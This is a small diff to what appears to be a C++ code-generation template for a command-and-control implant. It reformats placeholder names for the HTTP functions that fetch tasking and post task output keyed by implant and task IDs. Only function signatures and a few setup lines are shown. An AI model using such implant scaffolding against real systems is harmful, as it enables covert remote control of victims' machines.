@@ -32,7 +32,7 @@ Required Keys:
 #include "../protocols/http_wininet/http.h"
 using namespace std::string_literals;
 
-nlohmann::json [["http_get_function_name"]](std::string implant_uuid) {
+nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::string http_response_buffer;
 
@@ -150,7 +150,7 @@ nlohmann::json [["http_get_function_name"]](std::string implant_uuid) {
     return nullptr;
 }
 
-int [["http_post_function_name"]](std::string implant_uuid, std::string output_data, std::string task_uuid) {
+int [[ http_post_function_name ]](std::string implant_uuid, std::string output_data, std::string task_uuid) {
     // Prep Payload
     std::vector<uint8_t> task_response_msgpack;
     create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
